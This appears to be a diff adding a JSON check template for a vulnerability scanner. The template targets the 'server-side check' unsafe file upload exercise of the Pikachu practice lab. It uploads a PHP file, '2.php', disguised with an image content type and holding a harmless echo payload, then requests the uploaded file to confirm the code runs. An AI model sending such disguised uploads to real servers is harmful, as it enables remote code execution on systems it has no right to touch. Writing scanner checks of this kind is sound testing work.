@@ -1,0 +1,45 @@
+{
+    "name": "pikachu",
+    "vuln": "服务端check",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "3",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "POST",
+                "path": "/vul/unsafeupload/servercheck.php",
+                "cookie": "",
+                "requestheader": {
+                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryyR04LAH8y4fbPlKd"
+                },
+                "requestbody": "------WebKitFormBoundaryyR04LAH8y4fbPlKd\nContent-Disposition: form-data; name=\"uploadfile\"; filename=\"2.php\"\nContent-Type: image/png\n\n<?php  echo(6); ?>\n------WebKitFormBoundaryyR04LAH8y4fbPlKd\nContent-Disposition: form-data; name=\"submit\"\n\n开始上传\n------WebKitFormBoundaryyR04LAH8y4fbPlKd--"
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": ""
+            }
+        },
+        "2": {
+            "request": {
+                "host": "",
+                "method": "GET",
+                "path": "/vul/unsafeupload/uploads/2.php",
+                "cookie": "",
+                "requestheader": "",
+                "requestbody": ""
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "6"
+            }
+        }
+    }
+}
